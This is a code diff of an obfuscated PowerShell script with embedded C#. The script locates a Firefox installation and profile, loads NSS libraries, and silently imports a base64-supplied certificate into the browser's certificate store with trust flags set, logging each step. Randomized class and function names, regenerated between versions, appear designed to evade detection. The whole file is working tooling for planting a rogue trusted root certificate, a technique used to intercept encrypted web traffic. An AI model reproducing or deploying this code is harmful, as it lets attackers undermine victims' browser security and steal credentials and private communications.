@@ -1,4 +1,4 @@
-function tcXQywqUSqjH{
+function AXGzsQ{
 Add-Type @"
 using System;
 using System.IO;
@@ -6,29 +6,29 @@ using Microsoft.Win32;
 using System.Runtime.InteropServices;
 using System.ComponentModel;
 
-public sealed class bmioSaauKx
+public sealed class hyGDewxLfyAcQRq
 {
-	private static volatile bmioSaauKx CSabcn;
-	private static object EaqLHdMhdBZETrI = new Object();
-	public static bmioSaauKx dgahhQoyteFKij()
+	private static volatile hyGDewxLfyAcQRq orGABCBXve;
+	private static object JHWXRXHyN = new Object();
+	public static hyGDewxLfyAcQRq eTEoiHzUQyzJ()
     {
-        if (CSabcn == null)
+        if (orGABCBXve == null)
         {
-            lock (EaqLHdMhdBZETrI)
+            lock (JHWXRXHyN)
             {
-                if (CSabcn == null)
-                CSabcn = new bmioSaauKx();
+                if (orGABCBXve == null)
+                orGABCBXve = new hyGDewxLfyAcQRq();
             }
         }
-        return CSabcn;
+        return orGABCBXve;
     }
 	
-	const int MSQEcNzGwNd=0;
+	const int HhFoJCaWhJXvE=0;
     
     [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
     static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
 
-    private static IntPtr fZi(string libPath)
+    private static IntPtr jBpf(string libPath)
     {
         if (String.IsNullOrEmpty(libPath))
             throw new ArgumentNullException("libPath");
@@ -94,63 +94,63 @@ public sealed class bmioSaauKx
         certUsageAnyCA = 11
     }
 	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate int pnkbfXcFoGnFy(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);
+    private delegate int SzYquMVSi(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);
 
-    private int DrSnqA(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
+    private int KXhnC(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
     {
-        IntPtr pProc = GetProcAddress(uKfqQI, "NSS_Initialize");
-        pnkbfXcFoGnFy ptr = (pnkbfXcFoGnFy)Marshal.GetDelegateForFunctionPointer(pProc, typeof(pnkbfXcFoGnFy));
+        IntPtr pProc = GetProcAddress(JyltTVe, "NSS_Initialize");
+        SzYquMVSi ptr = (SzYquMVSi)Marshal.GetDelegateForFunctionPointer(pProc, typeof(SzYquMVSi));
         return ptr(sConfigDir, certPrefix, keyPrefix, secModName, flags);
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate IntPtr DSWru();
-    private IntPtr VmNaPqe()
+    private delegate IntPtr GGx();
+    private IntPtr iUXUzs()
     {
-        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_GetDefaultCertDB");
-        DSWru ptr = (DSWru)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DSWru));
+        IntPtr pProc = GetProcAddress(JyltTVe, "CERT_GetDefaultCertDB");
+        GGx ptr = (GGx)Marshal.GetDelegateForFunctionPointer(pProc, typeof(GGx));
         return ptr();
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate IntPtr SQTDZwqDltww();
-    private IntPtr AuhROAD()
+    private delegate IntPtr gjenNrlO();
+    private IntPtr udWAhBdDCQ()
     {
-        IntPtr pProc = GetProcAddress(uKfqQI, "NSS_Shutdown");
-        SQTDZwqDltww ptr = (SQTDZwqDltww)Marshal.GetDelegateForFunctionPointer(pProc, typeof(SQTDZwqDltww));
+        IntPtr pProc = GetProcAddress(JyltTVe, "NSS_Shutdown");
+        gjenNrlO ptr = (gjenNrlO)Marshal.GetDelegateForFunctionPointer(pProc, typeof(gjenNrlO));
         return ptr();
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate int jgztPQYUcCqti(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
-    private int lNAhXCqNAOzryU(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
+    private delegate int lYsGnpsuRTIAC(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
+    private int gVzr(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
     {
-        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_ImportCerts");
-        jgztPQYUcCqti ptr = (jgztPQYUcCqti)Marshal.GetDelegateForFunctionPointer(pProc, typeof(jgztPQYUcCqti));
+        IntPtr pProc = GetProcAddress(JyltTVe, "CERT_ImportCerts");
+        lYsGnpsuRTIAC ptr = (lYsGnpsuRTIAC)Marshal.GetDelegateForFunctionPointer(pProc, typeof(lYsGnpsuRTIAC));
         return ptr(certdb, usage, ncerts, ref derCerts, ref retCerts, keepCerts, caOnly, nickname);
     }
 
-    private delegate int QoQlhxcZtWbU(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
-    private int enTg(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
+    private delegate int rFKkN(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
+    private int yCPtrXBZZwYVJTP(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
     {
-        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_ChangeCertTrust");
-        QoQlhxcZtWbU ptr = (QoQlhxcZtWbU)Marshal.GetDelegateForFunctionPointer(pProc, typeof(QoQlhxcZtWbU));
+        IntPtr pProc = GetProcAddress(JyltTVe, "CERT_ChangeCertTrust");
+        rFKkN ptr = (rFKkN)Marshal.GetDelegateForFunctionPointer(pProc, typeof(rFKkN));
         return ptr(certdb, cert, ref trust);
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    public delegate int MNnHOkgvTXcfx(IntPtr cert, uint ncerts);
-    private int xBTjtYhnvW(IntPtr cert, uint ncerts)
+    public delegate int jSRtBLdDnhxA(IntPtr cert, uint ncerts);
+    private int wMMSsukfiiYmyy(IntPtr cert, uint ncerts)
     {
-        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_DestroyCertArray");
-        MNnHOkgvTXcfx ptr = (MNnHOkgvTXcfx)Marshal.GetDelegateForFunctionPointer(pProc, typeof(MNnHOkgvTXcfx));
+        IntPtr pProc = GetProcAddress(JyltTVe, "CERT_DestroyCertArray");
+        jSRtBLdDnhxA ptr = (jSRtBLdDnhxA)Marshal.GetDelegateForFunctionPointer(pProc, typeof(jSRtBLdDnhxA));
         return ptr(cert, ncerts);
     }
 
-	private IntPtr uKfqQI = IntPtr.Zero;
-	
-	public Boolean SwQ(String sCert){
-        System.Console.WriteLine("bmioSaauKx Start");
+	private IntPtr JyltTVe = IntPtr.Zero;
+
+	public Boolean HSANcRm(String sCert){
+        System.Console.WriteLine(String.Format("hyGDewxLfyAcQRq Start. Process {0}-bit",IntPtr.Size * 8));
 		String sProfile = GetProfile();
         if (String.IsNullOrEmpty(sProfile))
         {
@@ -159,24 +159,49 @@ public sealed class bmioSaauKx
         }
         System.Console.WriteLine("Profile path="+sProfile);
         byte[] bCert = GetCertAsByteArray(sCert);
-		IntPtr ipCert = Marshal.AllocHGlobal(bCert.Length);
+        IntPtr ipCert = Marshal.AllocHGlobal(bCert.Length);
+        System.Console.WriteLine("Unpack cert OK");
 		try
         {
             DirectoryInfo diInstallPath = GetIP();
+            if (diInstallPath == null)
+            {
+                System.Console.WriteLine("diInstallPath is null");
+                String ffexe = @"C:\Program Files\Mozilla Firefox\firefox.exe";
+                if (File.Exists(ffexe))
+                {
+                    diInstallPath = new DirectoryInfo(Path.GetDirectoryName(ffexe));
+                    System.Console.WriteLine("Path found: "+Path.GetDirectoryName(ffexe));
+                }
+                else
+                {
+                    ffexe = @"C:\Program Files (x86)\Mozilla Firefox\firefox.exe";
+                    if (File.Exists(ffexe))
+                    {
+                        diInstallPath = new DirectoryInfo(Path.GetDirectoryName(ffexe));
+                        System.Console.WriteLine("Path found: "+Path.GetDirectoryName(ffexe));
+                    }
+                }
+            }
             String sCurrentDirectory = Directory.GetCurrentDirectory();
             Directory.SetCurrentDirectory(diInstallPath.FullName);
             System.Console.WriteLine("Install path="+diInstallPath.FullName);
             foreach(FileInfo fiDll in diInstallPath.GetFiles("*.dll"))
             {
                 if (fiDll.Name.Equals("breakpadinjector.dll")) continue;
-                fZi(fiDll.FullName);
+                try{
+                    jBpf(fiDll.FullName);
+                }catch (Exception ex){
+                    System.Console.WriteLine(String.Format("{0} {1} {2}", ex.Source, ex.Message, ex.StackTrace));
+                }
             }
-            uKfqQI = fZi(diInstallPath.FullName + "\\nss3.dll");
-            if (uKfqQI.Equals(IntPtr.Zero))
+            JyltTVe = jBpf(diInstallPath.FullName + "\\nss3.dll");
+            if (JyltTVe.Equals(IntPtr.Zero))
             {
                 System.Console.WriteLine("Firefox install directory not found");
                 return false;
             }
+            System.Console.WriteLine("Init dlls OK");
             Directory.SetCurrentDirectory(sCurrentDirectory);
             //Init cert
             Marshal.Copy(bCert, 0, ipCert, bCert.Length);
@@ -193,46 +218,48 @@ public sealed class bmioSaauKx
             CertTrust.iSoft = 0x10;
             System.Console.WriteLine("Init cert OK");
             //End init cert
-            int status = DrSnqA(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
-            if (status != MSQEcNzGwNd)
+            int status = KXhnC("sql:"+sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
+            if (status != HhFoJCaWhJXvE)
             {
                 System.Console.WriteLine(String.Format("NSS_InitReadWrite ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                 return false;
             }
-            IntPtr bd = VmNaPqe();
+            IntPtr bd = iUXUzs();
             if (bd == IntPtr.Zero)
             {
                 System.Console.WriteLine("CERT_GetDefaultCertDB Failed");
-                AuhROAD();
+                udWAhBdDCQ();
                 return false;
             }
             System.Console.WriteLine("CERT_GetDefaultCertDB OK");
             IntPtr CertToImport = new IntPtr();
             IntPtr[] aCertToImport = new IntPtr[1];
-            status = lNAhXCqNAOzryU(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
-            if (status != MSQEcNzGwNd)
+            status = gVzr(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
+            if (status != HhFoJCaWhJXvE)
             {
                 System.Console.WriteLine(String.Format("CERT_ImportCerts ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
-                AuhROAD();
+                udWAhBdDCQ();
                 return false;
             }
             System.Console.WriteLine("CERT_ImportCerts OK");
             Marshal.Copy(CertToImport, aCertToImport, 0, 1);
-            status = enTg(bd, aCertToImport[0], ref CertTrust);
-            if ( status != MSQEcNzGwNd) 
+            status = yCPtrXBZZwYVJTP(bd, aCertToImport[0], ref CertTrust);
+            if ( status != HhFoJCaWhJXvE) 
             {
                 System.Console.WriteLine(String.Format("CERT_ChangeCertTrust ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
-                AuhROAD();
+                udWAhBdDCQ();
                 return false;
             };
             System.Console.WriteLine("CERT_ChangeCertTrust OK");
-            xBTjtYhnvW(CertToImport, 1);
+            wMMSsukfiiYmyy(CertToImport, 1);
             System.Console.WriteLine("Add cert OK");
         }
-        catch (Exception){}
+        catch (Exception ex){
+            System.Console.WriteLine(String.Format("{0} {1} {2}", ex.Source, ex.Message, ex.StackTrace));
+        }
         finally
         {
-            AuhROAD();
+            udWAhBdDCQ();
         }
 		return true;
 	}
@@ -254,7 +281,9 @@ public sealed class bmioSaauKx
         {
             return Convert.FromBase64String(sCert);
         }
-        catch (Exception){}
+        catch (Exception ex){
+            System.Console.WriteLine(String.Format("{0} {1} {2}", ex.Source, ex.Message, ex.StackTrace));
+        }
         return null;
     }
 	private DirectoryInfo GetIP()
@@ -285,8 +314,9 @@ public sealed class bmioSaauKx
 
                 fp = new DirectoryInfo(installString);
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                System.Console.WriteLine(String.Format("{0} {1} {2}", ex.Source, ex.Message, ex.StackTrace));
             }
         }
         else if (localMachine2 != null)
@@ -307,14 +337,17 @@ public sealed class bmioSaauKx
                     throw new NullReferenceException("Install string was null");
                 fp = new DirectoryInfo(installString);
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                System.Console.WriteLine(String.Format("{0} {1} {2}", ex.Source, ex.Message, ex.StackTrace));
             }
+        }else{
+            System.Console.WriteLine("Registry records not found");
         }
         return fp;
     }
 }
 "@;
-[bmioSaauKx]::dgahhQoyteFKij().SwQ("%CERT%");
+[hyGDewxLfyAcQRq]::eTEoiHzUQyzJ().HSANcRm("%CERT%");
 }
-tcXQywqUSqjH
+AXGzsQ
